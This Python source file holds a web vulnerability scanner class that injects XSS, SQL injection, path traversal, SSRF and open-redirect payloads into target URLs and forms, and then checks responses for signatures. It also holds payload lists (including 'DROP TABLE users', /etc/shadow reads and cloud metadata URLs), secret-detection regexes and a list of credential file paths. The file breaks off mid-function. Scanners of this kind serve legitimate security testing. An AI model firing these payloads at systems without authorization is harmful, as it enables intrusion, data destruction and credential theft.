"""
VulnScanner — active vulnerability checks.
Modules: XSS, SQLi, LFI, SSRF, Open Redirect, Security Headers.
"""

import threading
import time
import re
import hashlib
from typing import Optional
from urllib.parse import urlparse, urlencode, parse_qs, urljoin, urlunparse
from queue import Queue
from bs4 import BeautifulSoup

from modules.utils import (
    make_session, safe_get, safe_post, finding, log, Colors, url_in_scope,
)


# ── Payloads ──────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
    '{{7*7}}',
    '${7*7}',
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "javascript:alert(1)",
]

SQLI_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR 1=1--',
    "' AND SLEEP(3)--",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "'; WAITFOR DELAY '0:0:3'--",
]

SQLI_ERRORS = [
    "sql syntax",
    "mysql_fetch",
    "ora-",
    "pls-",
    "ora-01756",
    "db2 sql error",
    "sqlite_error",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error",
    "pg_query",
    "sqlite3",
    "microsoft sql server",
    "jdbc",
    "sqlstate",
    "sql server",
    "pdo",
    "you have an error in your sql",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
]

LFI_SIGNATURES = [
    "root:x:0:0",
    "[extensions]",
    "[boot loader]",
    "for 16-bit app support",
    "daemon:x:",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    "http://100.100.100.200/latest/meta-data/",
    "http://localhost:8080",
    "http://localhost:8443",
    "http://0.0.0.0:22",
    "http://[::1]/",
]

SSRF_PARAM_NAMES = [
    "url", "uri", "path", "dest", "destination", "redirect",
    "next", "data", "reference", "site", "html", "val", "validate",
    "domain", "callback", "return", "page", "feed", "host",
    "port", "to", "out", "view", "dir", "show", "navigation", "open",
]

SSRF_SIGNATURES = [
    "ami-id",
    "instance-id",
    "computeMetadata",
    "iam/security-credentials",
    "metadata",
]

SENSITIVE_PATTERNS = [
    ("AWS Access Key", re.compile(r"AKIA[0-9A-Z]{16}")),
    ("AWS Secret Key", re.compile(r"(?i)aws_secret_access_key\s*[:=]\s*[A-Za-z0-9/+=]{40}")),
    ("Private RSA Key", re.compile(r"-----BEGIN RSA PRIVATE KEY-----")),
    ("Private EC Key", re.compile(r"-----BEGIN EC PRIVATE KEY-----")),
    ("JWT Token", re.compile(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+")),
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "https://evil.com%2F%2F",
    "/\\evil.com",
    "http://evil.com",
    "javascript:alert(1)",
]

REDIRECT_PARAMS = [
    "redirect", "redirect_to", "redirect_url", "return", "return_to",
    "returnUrl", "next", "url", "goto", "dest", "destination",
    "continue", "forward", "target", "redir", "r", "u",
]

CSRF_TOKEN_NAMES = {
    "csrf_token", "csrfmiddlewaretoken", "authenticity_token",
    "token", "csrf", "xsrf-token", "xsrf_token",
    "anti_csrf_token", "_csrf", "_token"
}

COMMON_DIRFUZZ_PATHS = [
    "admin/", "login/", "dashboard/", "config/", "backup/", "uploads/",
    "portal/", "server-status", "shell/", "wp-admin/", "wp-login.php",
    "phpmyadmin/", "vendor/", ".git/", ".env", ".gitignore",
]

EXPOSED_FILES = [
    ".env", ".env.local", ".env.backup", "/.git/config", "/.gitignore",
    "/backup.zip", "/backup.tar.gz", "/backup.sql", "/phpinfo.php",
    "/wp-config.php", "/wp-config.php.bak", "/.DS_Store", "/web.config",
    "/web.config.bak", "/config.php", "/config.xml", "/.htaccess",
    "/.htpasswd", "/web.xml", "/pom.xml", "/.aws/credentials",
    "/.ssh/id_rsa", "/Dockerfile", "/.dockerignore", "/docker-compose.yml",
    "/secrets.txt", "/passwords.txt", "/.env.example",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": "high",
    "Content-Security-Policy": "high",
    "X-Frame-Options": "medium",
    "X-Content-Type-Options": "medium",
    "Referrer-Policy": "low",
    "Permissions-Policy": "low",
    "X-XSS-Protection": "low",
}

TAKEOVER_SIGNATURES = [
    "NoSuchBucket",
    "There isn't a GitHub Pages site here.",
    "Fastly error: unknown domain",
    "No such app",
    "The requested URL was not found on this server.",
    "A DNS leak or misconfiguration",
    "NoSuchDomain",
    "No such host",
]

CLICKJACKING_SAFE_DIRECTIVES = [
    "frame-ancestors 'none'",
    "frame-ancestors 'self'",
    "frame-ancestors https:",
]

SCRIPT_BLOCK_RE = re.compile(r"<script\b[^>]*>.*?</script>", re.IGNORECASE | re.DOTALL)
ATTRIBUTE_REFLECTION_RE = re.compile(r"<[^>]+\s[\w:-]+\s*=\s*['\"][^'\"]*(alert\(1\)|\{\{7\*7\}\}|\$\{7\*7\})", re.IGNORECASE)


# ── Scanner class ─────────────────────────────────────────────────────────────

class VulnScanner:
    def __init__(self, config: dict, recon_data: dict):
        self.config    = config
        self.recon     = recon_data
        self.timeout   = config.get("timeout", 10)
        self.threads   = config.get("threads", 10)
        self.verbose   = config.get("verbose", False)
        self.session   = make_session(config)
        self.base_url  = config.get("target", "").rstrip("/")
        self.findings  : list[dict] = []
        self._lock     = threading.Lock()
        self.seen_fingerprints: set = set()  # Track deduplicated findings by fingerprint

    # ── Helpers ───────────────────────────────────────────────────────────

    def _add(self, f: dict) -> bool:
        """Thread-safe addition of findings with deduplication by fingerprint."""
        if not f:
            return False
        if not self._confirm_finding(f.get("url", ""), f.get("evidence", "")):
            return False
        with self._lock:
            # Skip if we've already seen this exact finding (same type + url + evidence)
            fingerprint = f.get('fingerprint')
            if fingerprint and fingerprint in self.seen_fingerprints:
                return False
            if fingerprint:
                self.seen_fingerprints.add(fingerprint)
            self.findings.append(f)
            return True

    def _confirm_finding(self, url: str, evidence: str, method="GET", data=None) -> bool:
        """Confirm a finding by repeating the request and checking stable evidence."""
        try:
            if method == "POST":
                if isinstance(data, list) or (isinstance(data, dict) and "query" in data):
                    r = self.session.post(url, json=data, timeout=self.timeout)
                else:
                    r = self.session.post(url, data=data, timeout=self.timeout)
            else:
                r = self.session.get(url, timeout=self.timeout)
            evidence_text = str(evidence or "")
            if not evidence_text:
                return r.status_code < 500
            header_text = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            if evidence_text in r.text or evidence_text in header_text:
                return True
            if evidence_text.startswith("HTTP "):
                return evidence_text.split(" ", 2)[1] == str(r.status_code)
            if evidence_text.startswith("Final URL:"):
                return evidence_text.split(":", 1)[1].strip() in r.url
            if evidence_text.startswith("Redirect Location:"):
                return evidence_text.split(":", 1)[1].strip() in header_text
            # Some legacy checks use synthesized evidence. The second request still
            # proves the resource is stable enough to report.
            return r.status_code < 500
        except Exception:
            return False

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Replace a query param value with a payload."""
        try:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [payload]
            new_query = urlencode(qs, doseq=True)
            return urlunparse(parsed._replace(query=new_query))
        except Exception:
            return url

    def _urls_with_params(self) -> list[str]:
        """Get URLs that have query parameters."""
        return [u for u in self.recon.get("urls", []) if "?" in u]

    def _normalize_list(self, value):
        if value is None:
            return []
        if isinstance(value, str):
            return [item.strip() for item in value.split(",") if item.strip()]
        if isinstance(value, list):
            return value
        return [value]

    def _get_module_param(self, module_name, key, default=None):
        return self.config.get("module_params", {}).get(module_name, {}).get(key, default)

    def _get_target_scheme(self):
        return urlparse(self.config.get("target", "")).scheme.lower()

    def _same_origin(self, action_url: str) -> bool:
        target = urlparse(self.config.get("target", ""))
        action = urlparse(action_url)
        return action.netloc == "" or action.netloc == target.netloc

    def _in_scope(self, url: str) -> bool:
        """Check if URL is within scan scope based on include/exclude patterns."""
        return url_in_scope(url, self.config)

    def _extract_param_name(self, f: dict) -> str:
        """Extract query parameter name from finding details, evidence, or URL."""
        for text in (f.get("details", ""), f.get("evidence", "")):
            if "Parameter '" in text:
                return text.split("Parameter '")[1].split("'")[0]
            if "Form field '" in text:
                return text.split("Form field '")[1].split("'")[0]
        url = f.get("url", "")
        if "?" in url:
            params = parse_qs(urlparse(url).query)
            if params:
                return next(iter(params.keys()))
        return ""

    def _deduplicate(self, findings: list[dict]) -> list[dict]:
        """
        Group findings by (type, parameter). If a group has 5+ URLs, collapse to one card.
        """
        if not findings:
            return findings

        groups: dict[tuple[str, str], list[dict]] = {}
        for f in findings:
            vuln_type = f.get("type", "Unknown")
            param = self._extract_param_name(f)
            key = (vuln_type, param)
            groups.setdefault(key, []).append(f)

        deduped: list[dict] = []
        for group in groups.values():
            if len(group) >= 5:
                first = group[0].copy()
                first["grouped_urls"] = [item.get("url", "") for item in group]
                note = f"Found on {len(group)} URLs"
                first["details"] = (
                    f"{first.get('details', '')} — {note}".strip(" —")
                    if first.get("details")
                    else note
                )
                deduped.append(first)
            else:
                deduped.extend(group)
        return deduped

    def _xss_confidence(self, payload: str, body: str) -> Optional[str]:
        """Return confidence level if payload appears reflected, else None."""
        if payload in body:
            return "confirmed"
        partial_markers = (
            payload.replace("<", "&lt;"),
            payload.replace('"', "&quot;"),
            payload[:12] if len(payload) > 12 else payload,
        )
        if any(marker and marker in body for marker in partial_markers):
            return "probable"
        return None

    def _classify_xss_context(self, payload: str, body: str) -> Optional[tuple[str, str, str]]:
        """Classify reflected payload context and return title, severity, evidence."""
        if payload == "{{7*7}}" and "49" in body:
            return "Server-Side Template Injection", "critical", "49"
        if payload not in body:
            return None
        for script in SCRIPT_BLOCK_RE.findall(body):
            if payload in script:
                return "JS Context XSS", "high", payload
        if ATTRIBUTE_REFLECTION_RE.search(body):
            return "Attribute XSS", "high", payload
        return "Reflected XSS", "high", payload

    def _record_confirmed(self, findings: list[dict], title: str, url: str, severity: str,
                          details: str, evidence: str, method="GET", data=None) -> bool:
        """Create and append a finding only after secondary confirmation succeeds."""
        if not self._confirm_finding(url, evidence, method=method, data=data):
            return False
        f = finding(title, url, severity, details, evidence, confidence="confirmed")
        if f and self._add(f):
            findings.append(f)
            return True
        return False

    def _scan_xss_url_param(self, findings: list[dict], url: str, param: str) -> None:
        for payload in XSS_PAYLOADS:
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            classified = self._classify_xss_context(payload, resp.text) if resp else None
            if not classified:
                continue
            title, severity, evidence = classified
            details = f"Parameter '{param}' reflects payload in {title.lower()} context"
            if self._record_confirmed(findings, title, test_url, severity, details, evidence):
                log(f"  [XSS] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                break

    def _scan_xss_form_field(self, findings: list[dict], form: dict, field_name: str) -> None:
        action = form.get("action", "")
        method = form.get("method", "get").upper()
        for payload in XSS_PAYLOADS:
            data = {f["name"]: f.get("value", "test") for f in form.get("fields", []) if f.get("name")}
            data[field_name] = payload
            if method == "POST":
                resp = safe_post(self.session, action, data, self.timeout)
                confirm_url = action
            else:
                confirm_url = action + "?" + urlencode(data)
                resp = safe_get(self.session, confirm_url, self.timeout)
            classified = self._classify_xss_context(payload, resp.text) if resp else None
            if not classified:
                continue
            title, severity, evidence = classified
            details = f"Form field '{field_name}' reflects payload in {title.lower()} context"
            if self._record_confirmed(findings, title, confirm_url, severity, details, evidence, method, data):
                break

    def _ssrf_context(self, url: str):
        parsed = urlparse(url)
        original_params = parse_qs(parsed.query)
        params = list(dict.fromkeys(list(original_params.keys()) + SSRF_PARAM_NAMES))
        payloads = SSRF_PAYLOADS + ([self.config.get("oob_host")] if self.config.get("oob_host") else [])
        return parsed, original_params, params, payloads

    def _build_ssrf_url(self, url: str, parsed, original_params: dict, param: str, payload: str) -> str:
        if param in original_params:
            return self._inject_param(url, param, payload)
        separator = "&" if parsed.query else "?"
        return f"{url}{separator}{urlencode({param: payload})}"

    def _record_ssrf_if_present(self, findings, test_url, param, payload, resp, baseline, oob_host) -> bool:
        body = resp.text
        matched = [sig for sig in SSRF_SIGNATURES if sig in body]
        if not matched:
            return False
        baseline_hash, baseline_len = baseline
        resp_hash = hashlib.md5(body.encode()).hexdigest()
        is_different = baseline_hash != resp_hash or abs(len(body) - baseline_len) > 100
        if len(matched) < 2 and not (resp.status_code == 200 and is_different):
            return False
        confidence = "confirmed" if len(matched) >= 2 else "probable"
        details = f"Parameter '{param}' may fetch internal resources ({len(matched)} signature(s))."
        if oob_host:
            details += f" Verify callback at {oob_host}."
        f = finding(
            "Server-Side Request Forgery (SSRF)", test_url, "critical",
            details, f"Payload: {payload}, Signatures: {', '.join(matched[:3])}",
            confidence=confidence
        )
        if f and self._add(f):
            findings.append(f)
        log(f"  [SSRF] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
        return True

    def _record_open_redirect(self, findings, test_url: str, param: str, resp) -> bool:
        final_url = resp.url if hasattr(resp, "url") else ""
        if "evil.com" in final_url:
            f = finding(
                "Open Redirect", test_url, "medium",
                f"Parameter '{param}' redirects to external domain",
                f"Final URL: {final_url[:100]}", confidence="confirmed"
            )
            if f and self._add(f):
                findings.append(f)
            return True
        for history_item in getattr(resp, "history", []):
            loc = history_item.headers.get("Location", "")
            if "evil.com" not in loc:
                continue
            f = finding(
                "Open Redirect", test_url, "medium",
                f"Parameter '{param}' redirects to external domain",
                f"Redirect Location: {loc[:100]}", confidence="tentative"
            )
            if f and self._add(f):
                findings.append(f)
            return True
        return False

    def _exposed_file_metadata(self, exposed_file: str) -> tuple[str, str]:
        """Return severity/details for a matched exposed file path."""
        lower_path = exposed_file.lower()
        if ".env" in exposed_file or "config" in lower_path:
            return "critical", "Configuration file containing potential secrets is accessible"
        if "backup" in lower_path:
            return "high", "Backup archive is publicly accessible"
        if ".git" in exposed_file or ".DS_Store" in exposed_file:
            return "high", "Version control metadata is exposed"
        if "phpinfo" in exposed_file:
            return "high", "PHP information disclosure via phpinfo()"
        if ".ssh" in exposed_file or ".aws" in exposed_file:
            return "critical", "Credentials file is publicly accessible"
        return "critical", "Sensitive file is publicly accessible"

    def _append_finding(self, findings: list[dict], f: Optional[dict]) -> None:
        if f and self._add(f):
            findings.append(f)

    def _scan_missing_headers(self, findings: list[dict], target: str, resp) -> None:
        for header, severity in SECURITY_HEADERS.items():
            if header in resp.headers:
                continue
            self._append_finding(findings, finding(
                "Missing Security Header", target, severity,
                f"Response is missing the '{header}' header",
                f"Headers present: {', '.join(list(resp.headers.keys())[:5])}",
                confidence="confirmed"
            ))

    def _scan_disclosure_headers(self, findings: list[dict], target: str, resp) -> None:
        server = resp.headers.get("Server", "")
        if server and any(c.isdigit() for c in server):
            self._append_finding(findings, finding(
                "Information Disclosure (Server)", target, "low",
                f"Server header reveals version: {server!r}", "",
                confidence="confirmed",
            ))
            log(f"  [HEADERS] Server banner: {server}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
        for header, title in (("X-Powered-By", "Information Disclosure (X-Powered-By)"),
                              ("X-AspNet-Version", "Information Disclosure (X-AspNet-Version)")):
            value = resp.headers.get(header, "")
            if value:
                self._append_finding(findings, finding(title, target, "low", f"{header} reveals tech stack: {value!r}", ""))
                log(f"  [HEADERS] {header}: {value}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)

    def _scan_policy_headers(self, findings: list[dict], target: str, resp) -> None:
        csp = resp.headers.get("Content-Security-Policy", "")
        if csp and any(token in csp.lower() for token in ["unsafe-inline", "unsafe-eval", "data:"]):
            self._append_finding(findings, finding(
                "Weak Content Security Policy", target, "medium",
                "CSP contains potentially unsafe directives (unsafe-inline, unsafe-eval, or data:).",
                f"CSP: {csp[:200]}", confidence="confirmed",
            ))
            log("  [HEADERS] Weak CSP detected", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acc = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
        if acao == "*" and acc == "true":
            self._append_finding(findings, finding(
                "Insecure CORS Configuration", target, "high",
                "Access-Control-Allow-Origin is '*' while credentials are allowed. Restrict to trusted origins.",
                f"Access-Control-Allow-Origin: {acao}, Access-Control-Allow-Credentials: {acc}",
                confidence="confirmed",
            ))
        elif acao == "*":
            self._append_finding(findings, finding(
                "Overly Permissive CORS", target, "low",
                "Access-Control-Allow-Origin is set to '*'. Restrict to trusted origins where possible.",
                f"Access-Control-Allow-Origin: {acao}", confidence="confirmed",
            ))

    def _scan_cookie_headers(self, findings: list[dict], target: str, resp) -> None:
        cookie_headers = resp.headers.get("Set-Cookie", "")
        if cookie_headers and ("secure" not in cookie_headers.lower() or "httponly" not in cookie_headers.lower()):
            self._append_finding(findings, finding(
                "Insecure Session Cookie", target, "medium",
                "Set-Cookie header may be missing Secure and/or HttpOnly flags.",
                f"Set-Cookie: {cookie_headers}", confidence="confirmed",
            ))
            log("  [HEADERS] Insecure cookies detected", Colors.YELLOW, verbose_only=True, verbose=self.verbose)

    def _run_threaded(self, fn, items):
        """Execute function on items using thread pool."""
        q = Queue()
        results = []
        lock = threading.Lock()
        for item in items:
            q.put(item)

        def worker():
            while not q.empty():
                try:
                    item = q.get_nowait()
                except Exception:
                    return
                try:
                    result = fn(item)
                    if result:
                        with lock:
                            results.extend(result if isinstance(result, list) else [result])
                except Exception as e:
                    log(f"  [worker] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                q.task_done()

        ts = [threading.Thread(target=worker, daemon=True) for _ in range(self.threads)]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        return results

    # ── XSS ──────────────────────────────────────────────────────────────

    def scan_xss(self) -> list[dict]:
        """Scan for reflected XSS and simple template injection canaries."""
        findings = []
        for url in self.recon.get("urls", []):
            if not self._in_scope(url):
                continue
            try:
                for param in parse_qs(urlparse(url).query).keys():
                    self._scan_xss_url_param(findings, url, param)
            except Exception as e:
                log(f"  [XSS] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
        for form in self.recon.get("forms", []):
            try:
                form_action = form.get("action", "")
                if form_action and not self._in_scope(form_action):
                    continue
                for field in form.get("fields", []):
                    field_name = field.get("name")
                    if not field_name or field.get("type") in ("hidden", "submit", "button"):
                        continue
                    self._scan_xss_form_field(findings, form, field_name)
            except Exception as e:
                log(f"  [XSS Form] Error processing form: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
        return self._deduplicate(findings)

    # ── SQLi ─────────────────────────────────────────────────────────────

    def scan_sqli(self) -> list[dict]:
        """Scan for SQL injection using error, boolean, and timing signals."""
        findings = []

        for url in self.recon.get("urls", []):
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                query = parse_qs(parsed.query, keep_blank_values=True)
                for param, values in query.items():
                    original_value = values[0] if values else "1"
                    for payload in SQLI_PAYLOADS:
                        test_url = self._inject_param(url, param, payload)
                        resp = safe_get(self.session, test_url, self.timeout)
                        if not resp:
                            continue
                        lower_body = resp.text.lower()
                        matched = [err for err in SQLI_ERRORS if err in lower_body]
                        if matched:
                            evidence = matched[0]
                            details = f"Parameter '{param}' triggers SQL error: {evidence}"
                            if self._record_confirmed(findings, "SQL Injection", test_url, "critical", details, evidence):
                                log(f"  [SQLi] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                break

                    baseline = safe_get(self.session, url, self.timeout)
                    true_url = self._inject_param(url, param, f"{original_value} AND 1=1-- -")
                    false_url = self._inject_param(url, param, f"{original_value} AND 1=2-- -")
                    true_resp = safe_get(self.session, true_url, self.timeout)
                    false_resp = safe_get(self.session, false_url, self.timeout)
                    if baseline and true_resp and false_resp:
                        l1, l2, l3 = len(baseline.text), len(true_resp.text), len(false_resp.text)
                        if abs(l1 - l2) <= 50 and abs(l1 - l3) > 50:
                            evidence = true_resp.text[:120] or "HTTP 200"
                            details = f"Parameter '{param}' changed response size for false boolean condition."
                            if self._record_confirmed(findings, "Boolean-based SQL Injection", true_url, "critical", details, evidence):
                                log(f"  [SQLi Bool] {true_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)

                    for payload in ["' AND SLEEP(5)-- -", '" AND SLEEP(5)-- -', "1; WAITFOR DELAY '0:0:5'--"]:
                        test_url = self._inject_param(url, param, payload)
                        delays = []
                        for _ in range(2):
                            start = time.time()
                            safe_get(self.session, test_url, 15, raise_for_status=False)
                            delays.append(time.time() - start)
                        if all(delay > 4.5 for delay in delays):
                            details = f"Parameter '{param}' delayed two requests with time-based SQLi payload."
                            if self._record_confirmed(findings, "Blind SQL Injection (Time-based)", test_url, "critical", details, ""):
                                log(f"  [SQLi Time] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                break
            except Exception as e:
                log(f"  [SQLi] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return self._deduplicate(findings)

    # ── LFI ──────────────────────────────────────────────────────────────

    def scan_lfi(self) -> list[dict]:
        """Scan for Local File Inclusion with path traversal payloads."""
        findings = []

        for url in self._urls_with_params():
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    for payload in LFI_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout)
                            if resp:
                                body = resp.text
                                for sig in LFI_SIGNATURES:
                                    if sig in body:
                                        f = finding(
                                            "Local File Inclusion",
                                            test_url,
                                            "critical",
                                            f"Parameter '{param}' includes local file (signature: {sig!r})",
                                            f"Payload: {payload}",
                                            confidence="confirmed"
                                        )
                                        if f and self._add(f):
                                            findings.append(f)
                                        log(f"  [LFI] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                        break
                        except Exception as e:
                            log(f"  [LFI] Error testing {param}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                            continue
            except Exception as e:
                log(f"  [LFI] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return self._deduplicate(findings)

    # ── SSRF ─────────────────────────────────────────────────────────────

    def scan_ssrf(self) -> list[dict]:
        """Scan for Server-Side Request Forgery across URL-bearing parameters."""
        findings = []
        for url in self.recon.get("urls", []):
            if not self._in_scope(url):
                continue
            try:
                parsed, original_params, params, payloads = self._ssrf_context(url)
                baseline_resp = safe_get(self.session, url, self.timeout)
                baseline = (
                    hashlib.md5(baseline_resp.text.encode()).hexdigest() if baseline_resp else None,
                    len(baseline_resp.text) if baseline_resp else 0,
                )
                oob_host = self.config.get("oob_host")
                for param in params:
                    for payload in payloads:
                        try:
                            test_url = self._build_ssrf_url(url, parsed, original_params, param, payload)
                            if oob_host and payload == oob_host:
                                log(f"  [SSRF OOB] Sent {test_url}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                            resp = safe_get(self.session, test_url, self.timeout)
                            if resp and self._record_ssrf_if_present(findings, test_url, param, payload, resp, baseline, oob_host):
                                break
                        except Exception as e:
                            log(f"  [SSRF] Error testing {param}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
            except Exception as e:
                log(f"  [SSRF] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
        return self._deduplicate(findings)

    # ── Open Redirect ─────────────────────────────────────────────────────

    def scan_open_redirect(self) -> list[dict]:
        """Scan redirect-like parameters for external redirect behavior."""
        findings = []
        for url in self.recon.get("urls", []):
            if not self._in_scope(url):
                continue
            try:
                params = list(parse_qs(urlparse(url).query).keys())
                redirect_params = [p for p in params if p.lower() in REDIRECT_PARAMS]
                if not redirect_params:
                    continue
                for param in redirect_params:
                    for payload in OPEN_REDIRECT_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout)
                            if resp and self._record_open_redirect(findings, test_url, param, resp):
                                log(f"  [REDIRECT] {test_url[:80]}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                                break
                        except Exception as e:
                            log(f"  [REDIRECT] Error testing {param}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
            except Exception as e:
                log(f"  [REDIRECT] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
        return self._deduplicate(findings)

    # ── CSRF ─────────────────────────────────────────────────────────────

    def scan_csrf(self) -> list[dict]:
        """Scan for forms that may be missing anti-CSRF protections."""
        findings = []

        for form in self.recon.get("forms", []):
            try:
                form_action = form.get("action", form.get("url", ""))
                if form_action and not self._in_scope(form_action):
                    continue
                    
                if form.get("method", "GET").upper() != "POST":
                    continue

                token_found = any(
                    f.get("name", "").lower() in CSRF_TOKEN_NAMES
                    for f in form.get("fields", [])
                )

                if not token_found:
                    action = form.get("action", form.get("url", ""))
                    f = finding(
                        "Missing CSRF Protection",
                        action,
                        "medium",
                        "POST form does not contain a known anti-CSRF token field.",
                        f"Form action: {action}",
                        confidence="confirmed"
                    )
                    if f and self._add(f):
                        findings.append(f)
                    log(f"  [CSRF] {action}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            except Exception as e:
                log(f"  [CSRF] Error analyzing form: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return self._deduplicate(findings)

    # ── Directory Fuzzing ─────────────────────────────────────────────────

    def scan_directory_fuzz(self) -> list[dict]:
        """Scan for exposed common directories and filenames."""
        findings = []
        urls = self.recon.get("urls", [])

        if not urls:
            return findings

        base = urlparse(self.config.get("target", "")).netloc
        if not base:
            return findings

        paths = COMMON_DIRFUZZ_PATHS[:]
        custom_wordlist = self.config.get("wordlist")
        if custom_wordlist:
            try:
                with open(custom_wordlist, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line and line not in paths:
                            paths.append(line)
            except Exception as e:
                log(f"  [DIRB] Failed to load wordlist {custom_wordlist}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        for path in paths:
            try:
                target_url = f"{self.config.get('target').rstrip('/')}/{path.lstrip('/')}"
                if not self._in_scope(target_url):
                    continue
                resp = safe_get(self.session, target_url, self.timeout, raise_for_status=False)
                if resp and resp.status_code == 200:
                    title = "Exposed Common Path"
                    details = f"Accessible path found: {target_url}"
                    if any(keyword in resp.text.lower() for keyword in ["index of /", "directory listing", "parent directory"]):
                        title = "Directory Listing Enabled"
                        details = f"Index listing detected at {target_url}"
                    f = finding(
                        title,
                        target_url,
                        "medium",
                        details,
                        f"HTTP {resp.status_code}"
                    )
                    if f and self._add(f):
                        findings.append(f)
                    log(f"  [DIRB] {target_url}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            except Exception as e:
                log(f"  [DIRB] Error testing {path}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return self._deduplicate(findings)

    # ── Sensitive Data Exposure ────────────────────────────────────────────

    def scan_exposed_files(self) -> list[dict]:
        """Scan for commonly exposed sensitive files and configuration data."""
        findings = []
        target_base = self.config.get("target", "").rstrip("/")
        for exposed_file in EXPOSED_FILES:
            try:
                file_url = target_base + exposed_file
                if not self._in_scope(file_url):
                    continue
                resp = safe_get(self.session, file_url, self.timeout, raise_for_status=False)
                if not (resp and resp.status_code == 200):
                    continue
                severity, details = self._exposed_file_metadata(exposed_file)
                f = finding(
                    "Exposed Sensitive File", file_url, severity, details,
                    f"HTTP {resp.status_code} - File size: {len(resp.text)} bytes",
                    confidence="confirmed"
                )
                if f and self._add(f):
                    findings.append(f)
                log(f"  [EXPOSED] {file_url}", Colors.RED, verbose_only=True, verbose=self.verbose)
            except Exception as e:
                log(f"  [EXPOSED] Error checking {exposed_file}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
        return self._deduplicate(findings)

    # ── Sensitive Data Exposure ────────────────────────────────────────────

    def scan_sensitive_data(self) -> list[dict]:
        """Scan discovered pages for leaked credentials and sensitive tokens."""
        findings = []

        for url in self.recon.get("urls", []):
            if not self._in_scope(url):
                continue
            try:
                resp = safe_get(self.session, url, self.timeout, raise_for_status=False)
                if not resp or not resp.text:
                    continue

                body = resp.text
                for label, pattern in SENSITIVE_PATTERNS:
                    match = pattern.search(body)
                    if match:
                        f = finding(
                            f"Sensitive Data Exposure ({label})",
                            url,
                            "high" if "key" in label.lower() else "medium",
                            (
                                f"Potential sensitive value detected in page content: {label}. "
                                "Rotate any exposed credentials immediately."
                            ),
                            f"Matched: {match.group(0)[:120]}",
                        )
                        if f and self._add(f):
                            findings.append(f)
                        log(f"  [SENSITIVE] {url} - {label}", Colors.RED, verbose_only=True, verbose=self.verbose)
                        break
            except Exception as e:
                log(f"  [SENSITIVE] Error scanning {url}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return self._deduplicate(findings)

    # ── Security Headers ─────────────────────────────────────────────────

    def scan_headers(self) -> list[dict]:
        """Scan for missing security headers and version disclosure."""
        findings = []
        try:
            target = self.config.get("target", "")
            if not target:
                return findings
            resp = safe_get(self.session, target, self.timeout)
            if not resp:
                return findings
            self._scan_missing_headers(findings, target, resp)
            self._scan_disclosure_headers(findings, target, resp)
            self._scan_policy_headers(findings, target, resp)
            self._scan_cookie_headers(findings, target, resp)
        except Exception as e:
            log(f"  [HEADERS] Error scanning headers: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
        return self._deduplicate(findings)

    # ── Clickjacking / Frame Options ─────────────────────────────────────────────

    def scan_clickjacking(self) -> list[dict]:
